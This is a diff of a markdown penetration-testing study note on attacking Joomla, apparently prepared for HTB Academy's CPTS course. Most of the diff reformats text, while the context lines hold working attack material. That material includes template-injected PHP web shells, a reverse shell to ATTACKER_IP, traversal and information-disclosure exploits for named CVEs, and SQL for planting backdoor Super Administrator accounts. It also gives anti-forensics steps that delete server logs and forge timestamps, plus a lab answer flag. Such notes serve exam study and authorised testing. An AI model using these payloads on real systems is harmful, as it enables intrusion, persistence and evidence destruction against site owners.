@@ -7,12 +7,13 @@
 With over 2.7 million Joomla installations worldwide and **426 CVE-registered vulnerabilities**, Joomla presents significant attack surfaces for penetration testers. Unlike WordPress's plugin-heavy ecosystem, Joomla attacks often focus on **template manipulation**, **core vulnerabilities**, and **component-specific exploits**. This guide covers systematic exploitation from initial access to complete system compromise.
 
 **Attack Vector Distribution:**
-- **🎯 Template Manipulation** - Primary RCE via admin access (Most Common)
-- **🔍 Core Vulnerabilities** - Directory traversal, authentication bypass (Medium Impact)
-- **⚡ Extension Exploits** - Component-specific vulnerabilities (Variable Impact)  
-- **🗄️ Database Exploitation** - Configuration disclosure and injection (High Impact)
 
----
+* **🎯 Template Manipulation** - Primary RCE via admin access (Most Common)
+* **🔍 Core Vulnerabilities** - Directory traversal, authentication bypass (Medium Impact)
+* **⚡ Extension Exploits** - Component-specific vulnerabilities (Variable Impact)
+* **🗄️ Database Exploitation** - Configuration disclosure and injection (High Impact)
+
+***
 
 ## Template Manipulation for RCE
 
@@ -21,11 +22,13 @@ With over 2.7 million Joomla installations worldwide and **426 CVE-registered vu
 #### Gaining Admin Panel Access
 
 **Prerequisites:**
-- Valid administrator credentials (from enumeration/brute force)
-- Access to `/administrator/` backend interface
-- Understanding of Joomla template structure
+
+* Valid administrator credentials (from enumeration/brute force)
+* Access to `/administrator/` backend interface
+* Understanding of Joomla template structure
 
 **Common Access Scenarios:**
+
 ```bash
 # Default credential exploitation
 admin:admin
@@ -85,6 +88,7 @@ curl -s "http://target.com/templates/protostar/error.php?cmd=bash+-c+'bash+-i+>%
 #### Advanced Template Modification Techniques
 
 **Method 2: Index.php Injection (Stealth)**
+
 ```php
 # Modify index.php with conditional backdoor
 <?php
@@ -102,6 +106,7 @@ if (isset($_GET['debug']) && $_GET['debug'] === 'maintenance') {
 ```
 
 **Method 3: Component PHP File Injection**
+
 ```bash
 # Target component files (less monitored)
 /templates/[template]/html/com_content/article/default.php
@@ -119,6 +124,7 @@ if ($_GET['component'] === 'shell') {
 ### Post-Exploitation Template Cleanup
 
 **Professional Cleanup Protocol:**
+
 ```bash
 # 1. Document modified files
 echo "Modified Files:" > cleanup_log.txt
@@ -137,21 +143,23 @@ rm -f /var/log/nginx/access.log
 # File location, hash, modification timestamp
 ```
 
----
+***
 
 ## Core Vulnerability Exploitation
 
 ### CVE-2019-10945: Directory Traversal & File Deletion
 
 **Vulnerability Details:**
-- **Affected Versions:** Joomla 1.5.0 through 3.9.4
-- **CVSS Score:** 7.2 (High)
-- **Attack Vector:** Authenticated directory traversal
-- **Impact:** File disclosure, arbitrary file deletion
+
+* **Affected Versions:** Joomla 1.5.0 through 3.9.4
+* **CVSS Score:** 7.2 (High)
+* **Attack Vector:** Authenticated directory traversal
+* **Impact:** File disclosure, arbitrary file deletion
 
 #### Manual Exploitation
 
 **Directory Traversal Attack:**
+
 ```bash
 # Basic directory traversal
 curl -X POST "http://target.com/administrator/index.php" \
@@ -167,6 +175,7 @@ curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templa
 ```
 
 **File Disclosure Targets:**
+
 ```bash
 # High-value target files
 /etc/passwd                    # System users
@@ -232,6 +241,7 @@ if __name__ == "__main__":
 ```
 
 **Usage Examples:**
+
 ```bash
 # Extract configuration file
 python3 joomla_cve_2019_10945.py http://target.com admin admin configuration.php
@@ -246,10 +256,11 @@ python3 joomla_cve_2019_10945.py http://target.com admin admin flag.txt
 ### CVE-2023-23752: Information Disclosure
 
 **Vulnerability Details:**
-- **Affected Versions:** Joomla 4.0.0 through 4.2.7
-- **CVSS Score:** 5.3 (Medium)
-- **Attack Vector:** Unauthenticated information disclosure
-- **Impact:** Database credentials, configuration data
+
+* **Affected Versions:** Joomla 4.0.0 through 4.2.7
+* **CVSS Score:** 5.3 (Medium)
+* **Attack Vector:** Unauthenticated information disclosure
+* **Impact:** Database credentials, configuration data
 
 #### Exploitation Method
 
@@ -272,6 +283,7 @@ curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq
 ### Historical Core Vulnerabilities
 
 #### CVE-2015-8562: Remote Code Execution
+
 ```bash
 # Session hijacking and RCE (Joomla 3.0.0-3.4.5)
 # Requires knowledge of valid session ID
@@ -281,19 +293,21 @@ python3 joomla_session_exploit.py --url http://target.com --session SESSION_ID
 ```
 
 #### CVE-2016-8869: SQL Injection
+
 ```bash
 # SQL injection in core fields (Joomla 3.4.4-3.6.3)
 curl -X POST "http://target.com/index.php?option=com_fields&task=field.storeform" \
   -d "jform[type]=sql&jform[params][query]=SELECT password FROM jos_users WHERE id=1"
 ```
 
----
+***
 
 ## Extension & Component Exploitation
 
 ### Common Vulnerable Components
 
 #### Component enumeration for vulnerabilities
+
 ```bash
 # Search for known vulnerable components
 searchsploit joomla com_
@@ -306,6 +320,7 @@ curl -s http://target.com/administrator/components/com_content/content.xml | gre
 #### High-Risk Component Categories
 
 **File Management Components:**
+
 ```bash
 # com_media vulnerabilities
 # Directory traversal and upload bypasses
@@ -321,6 +336,7 @@ curl -X POST "http://target.com/index.php?option=com_jce" \
 ```
 
 **User Management Components:**
+
 ```bash
 # com_users SQL injection
 curl "http://target.com/index.php?option=com_users&view=login&user[]=admin'OR'1'='1"
@@ -331,6 +347,7 @@ curl -X POST "http://target.com/index.php?option=com_community" \
 ```
 
 **Content Management Components:**
+
 ```bash
 # com_content XSS and injection
 curl -X POST "http://target.com/index.php?option=com_content&task=article.save" \
@@ -344,6 +361,7 @@ curl -X POST "http://target.com/index.php?option=com_k2&task=media.connector" \
 ### Extension Database Research
 
 **Vulnerability Research Workflow:**
+
 ```bash
 # 1. Enumerate installed extensions
 droopescan scan joomla --url http://target.com --enumerate a
@@ -362,7 +380,7 @@ done
 # - Joomla Security Center
 ```
 
----
+***
 
 ## Database Exploitation
 
@@ -371,6 +389,7 @@ done
 #### Extracting Database Credentials
 
 **Method 1: Direct File Access (Via Template Injection)**
+
 ```php
 # Inject into template file
 <?php
@@ -384,6 +403,7 @@ if (isset($_GET['config'])) {
 ```
 
 **Method 2: Directory Traversal (CVE-2019-10945)**
+
 ```bash
 # Use directory traversal to read config
 python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
@@ -391,6 +411,7 @@ python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
 ```
 
 **Method 3: Information Disclosure (CVE-2023-23752)**
+
 ```bash
 # Extract via API (Joomla 4.x)
 curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq '.data.attributes'
@@ -399,6 +420,7 @@ curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq
 #### Configuration File Structure Analysis
 
 **Standard configuration.php Layout:**
+
 ```php
 <?php
 class JConfig {
@@ -433,6 +455,7 @@ class JConfig {
 ### Direct Database Attacks
 
 #### MySQL Connection and Enumeration
+
 ```bash
 # Connect using extracted credentials
 mysql -h localhost -u joomla_user -p'database_password' joomla_database
@@ -448,6 +471,7 @@ SELECT user_id, group_id FROM jos_user_usergroup_map;
 ```
 
 #### Password Hash Analysis
+
 ```bash
 # Joomla password format: hash:salt
 # Examples:
@@ -462,6 +486,7 @@ john --format=joomla joomla_hashes.txt --wordlist=/usr/share/wordlists/rockyou.t
 ```
 
 #### Administrative User Creation
+
 ```sql
 -- Create new Super Administrator
 INSERT INTO jos_users (name, username, email, password, registerDate, lastvisitDate, params) 
@@ -477,13 +502,14 @@ INSERT INTO jos_user_usergroup_map (user_id, group_id) VALUES (@user_id, 8);
 SELECT * FROM jos_users WHERE username = 'backdoor';
 ```
 
----
+***
 
 ## Advanced Attack Techniques
 
 ### Privilege Escalation via User Groups
 
 #### Understanding Joomla ACL System
+
 ```sql
 -- User groups hierarchy (ascending privileges)
 -- 1: Public
@@ -503,6 +529,7 @@ JOIN jos_usergroups ug ON ugm.group_id = ug.id;
 ```
 
 #### Privilege Escalation Attack
+
 ```sql
 -- Escalate current user to Super Administrator
 UPDATE jos_user_usergroup_map 
@@ -517,6 +544,7 @@ VALUES ((SELECT id FROM jos_users WHERE username = 'target_user'), 8);
 ### Extension Installation for Persistence
 
 #### Malicious Extension Creation
+
 ```php
 # Create malicious plugin structure
 mkdir -p backdoor_plugin/backdoor
@@ -555,6 +583,7 @@ zip -r backdoor_plugin.zip backdoor_plugin/
 ### Log Poisoning and Analysis
 
 #### Apache Log Poisoning
+
 ```bash
 # Poison User-Agent in access logs
 curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
@@ -564,6 +593,7 @@ curl "http://target.com/templates/protostar/error.php?file=/var/log/apache2/acce
 ```
 
 #### Log Location Discovery
+
 ```bash
 # Common Joomla/Apache log locations
 /var/log/apache2/access.log
@@ -577,16 +607,18 @@ python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
   --username admin --password admin --dir /var/log/apache2/access.log
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab: Template Injection Flag Discovery
+
 **Question:** "Leverage the directory traversal vulnerability to find a flag in the root of the http://dev.inlanefreight.local/ Joomla application"
 
 **Solution Methodology (Template Injection + Reverse Shell):**
 
 #### Step 1: Setup Environment
+
 ```bash
 # Add VHost entry to /etc/hosts
 echo "STMIP dev.inlanefreight.local" >> /etc/hosts
@@ -596,6 +628,7 @@ curl -I http://dev.inlanefreight.local/
 ```
 
 #### Step 2: Admin Panel Access
+
 ```bash
 # Navigate to admin panel
 # URL: http://dev.inlanefreight.local/administrator/index.php
@@ -608,12 +641,15 @@ curl -X POST "http://dev.inlanefreight.local/administrator/index.php" \
 ```
 
 #### Step 3: Template Modification for Reverse Shell
+
 **Navigation Path:**
+
 1. **Extensions** → **Templates** → **Templates**
 2. Click **"Protostar Details and Files"**
 3. Click **error.php** to edit
 
 **Reverse Shell Injection:**
+
 ```php
 # Inject into error.php (replace existing content or add at top)
 <?php
@@ -627,6 +663,7 @@ shell_exec("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
 ```
 
 #### Step 4: Setup Listener and Trigger Shell
+
 ```bash
 # Setup netcat listener on attacking machine
 nc -nvlp 4444
@@ -642,6 +679,7 @@ curl http://dev.inlanefreight.local/templates/protostar/error.php
 ```
 
 #### Step 5: Flag Discovery via Reverse Shell
+
 ```bash
 # Once reverse shell is established:
 www-data@app01:/var/www/dev.inlanefreight.local/templates/protostar$
@@ -662,6 +700,7 @@ grep -r "j00mla" /var/www/ 2>/dev/null
 ```
 
 #### Step 6: Expected Output and Answer
+
 ```bash
 # Expected flag file location:
 /var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
@@ -676,6 +715,7 @@ j00mla_c0re_d1rtrav3rsal!
 ### Alternative Method: Web Shell Instead of Reverse Shell
 
 #### PHP Web Shell Injection
+
 ```php
 # Inject simple web shell into error.php
 <?php
@@ -695,18 +735,20 @@ curl "http://dev.inlanefreight.local/templates/protostar/error.php?cmd=cat+/var/
 ### Template Injection Methodology Summary
 
 **Key Steps for HTB Lab:**
+
 1. **VHost Configuration** - Add dev.inlanefreight.local to /etc/hosts
-2. **Admin Authentication** - Login with admin:admin credentials  
+2. **Admin Authentication** - Login with admin:admin credentials
 3. **Template Access** - Extensions → Templates → Protostar → error.php
 4. **Shell Injection** - Add reverse shell PHP code and save
 5. **Listener Setup** - Start netcat listener on attacking machine
 6. **Shell Activation** - Navigate to error.php to trigger callback
 7. **Flag Discovery** - Navigate filesystem to find flag file
-8. **Answer Extraction** - Read flag content: j00mla_c0re_d1rtrav3rsal!
+8. **Answer Extraction** - Read flag content: j00mla\_c0re\_d1rtrav3rsal!
 
 ### Alternative Lab Solutions
 
 #### Template Injection Method (If Traversal Fails)
+
 ```php
 # If directory traversal is patched, use template injection
 # Navigate to Templates → error.php and inject:
@@ -728,6 +770,7 @@ curl "http://dev.inlanefreight.local/templates/protostar/error.php?read_file=../
 ```
 
 #### Comprehensive File Discovery
+
 ```bash
 # Search for flag files with various extensions
 for ext in txt md flag; do
@@ -758,13 +801,14 @@ for location in "${locations[@]}"; do
 done
 ```
 
----
+***
 
 ## Professional Methodology & Workflow
 
 ### Systematic Joomla Exploitation Process
 
 #### Phase 1: Access Verification
+
 ```bash
 # 1. Confirm administrative access
 curl -X POST "http://target.com/administrator/index.php" \
@@ -779,6 +823,7 @@ curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templa
 ```
 
 #### Phase 2: Template Compromise
+
 ```bash
 # 1. Backup original template files
 curl -b cookies.txt \
@@ -796,6 +841,7 @@ echo "$(date): Modified error.php with web shell" >> exploitation_log.txt
 ```
 
 #### Phase 3: Information Gathering
+
 ```bash
 # 1. System enumeration
 curl "http://target.com/templates/protostar/error.php?cmd=uname+-a"
@@ -810,6 +856,7 @@ curl "http://target.com/templates/protostar/error.php?cmd=arp+-a"
 ```
 
 #### Phase 4: Lateral Movement Preparation
+
 ```bash
 # 1. Establish persistent access
 curl "http://target.com/templates/protostar/error.php?cmd=which+nc"
@@ -824,6 +871,7 @@ curl "http://target.com/templates/protostar/error.php?cmd=bash+-c+'bash+-i+>%26+
 ### Cleanup and Documentation
 
 #### Professional Cleanup Protocol
+
 ```bash
 # 1. Remove web shells
 # Restore original template files
@@ -862,13 +910,14 @@ Recommendations:
 EOF
 ```
 
----
+***
 
 ## Defense Evasion & OPSEC
 
 ### Stealth Template Modification
 
 #### Conditional Web Shells
+
 ```php
 # Time-based activation
 <?php
@@ -894,6 +943,7 @@ if ($_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (HTB Assessment)' && isset($_GE
 ```
 
 #### Encoded Payloads
+
 ```php
 # Base64 encoded commands
 <?php
@@ -917,6 +967,7 @@ if (isset($_GET['rot'])) {
 ### Anti-Forensics Techniques
 
 #### Log Cleaning
+
 ```php
 # Clear web server logs
 <?php
@@ -929,6 +980,7 @@ if (isset($_GET['clean'])) {
 ```
 
 #### File Timestamp Manipulation
+
 ```php
 # Preserve original timestamps
 <?php
@@ -940,13 +992,14 @@ if (isset($_GET['preserve'])) {
 ?>
 ```
 
----
+***
 
 ## Common Issues & Troubleshooting
 
 ### Template Editing Problems
 
 #### "Call to a member function format() on null" Error
+
 ```bash
 # Solution: Disable PHP Version Check plugin
 # Navigate to: Plugins → Quick Icon - PHP Version Check → Disable
@@ -957,6 +1010,7 @@ UPDATE jos_extensions SET enabled = 0 WHERE name = 'plg_quickicon_phpversionchec
 ```
 
 #### Template File Not Writable
+
 ```bash
 # Check file permissions via web shell
 curl "http://target.com/error.php?cmd=ls+-la+/var/www/html/templates/protostar/"
@@ -966,6 +1020,7 @@ curl "http://target.com/error.php?cmd=chmod+777+/var/www/html/templates/protosta
 ```
 
 #### Authentication Failures
+
 ```bash
 # Verify session handling
 curl -X POST "http://target.com/administrator/index.php" \
@@ -984,6 +1039,7 @@ curl -X POST "http://target.com/administrator/index.php" \
 ### Exploitation Limitations
 
 #### Extension-Specific Blocks
+
 ```bash
 # Some Joomla installations may block:
 # - Template editing for non-super administrators
@@ -995,6 +1051,7 @@ curl -X POST "http://target.com/administrator/index.php" \
 ```
 
 #### WAF/Security Plugin Detection
+
 ```bash
 # If requests are blocked, try:
 # - Different User-Agents
@@ -1007,23 +1064,24 @@ curl -H "User-Agent: Joomla/3.9.4" \
   "http://target.com/templates/protostar/error.php?cmd=id"
 ```
 
----
+***
 
 ## Next Steps & Advanced Techniques
 
 After successful Joomla exploitation:
 
-1. **[Database Persistence](joomla-database-persistence.md)** - SQL-based backdoors and triggers
-2. **[Network Pivoting](../pivoting-tunneling-port-forwarding/)** - Internal network reconnaissance
-3. **[Privilege Escalation](../../linux-privilege-escalation/)** - Local system compromise
-4. **[Active Directory Integration](../../active-directory-enumeration-attacks/)** - Domain environment attacks
+1. [**Database Persistence**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/joomla-database-persistence.md) - SQL-based backdoors and triggers
+2. [**Network Pivoting**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/pivoting-tunneling-port-forwarding/README.md) - Internal network reconnaissance
+3. [**Privilege Escalation**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/linux-privilege-escalation/README.md) - Local system compromise
+4. [**Active Directory Integration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/active-directory-enumeration-attacks/README.md) - Domain environment attacks
 
 ### Integration with Other Modules
 
 **🔗 Cross-Module Applications:**
-- **File Upload Attacks** - Bypass Joomla media restrictions
-- **Command Injection** - Template-based injection techniques  
-- **XSS Attacks** - Admin panel compromise vectors
-- **SQL Injection** - Database-level exploitation
 
-**💡 Key Takeaway:** Joomla exploitation primarily focuses on **template manipulation** for RCE after administrative access, supplemented by **core vulnerabilities** like directory traversal and **component-specific exploits**. The combination of built-in functionality abuse and CVE exploitation provides multiple pathways to system compromise across different Joomla versions and configurations. 
+* **File Upload Attacks** - Bypass Joomla media restrictions
+* **Command Injection** - Template-based injection techniques
+* **XSS Attacks** - Admin panel compromise vectors
+* **SQL Injection** - Database-level exploitation
+
+**💡 Key Takeaway:** Joomla exploitation primarily focuses on **template manipulation** for RCE after administrative access, supplemented by **core vulnerabilities** like directory traversal and **component-specific exploits**. The combination of built-in functionality abuse and CVE exploitation provides multiple pathways to system compromise across different Joomla versions and configurations.
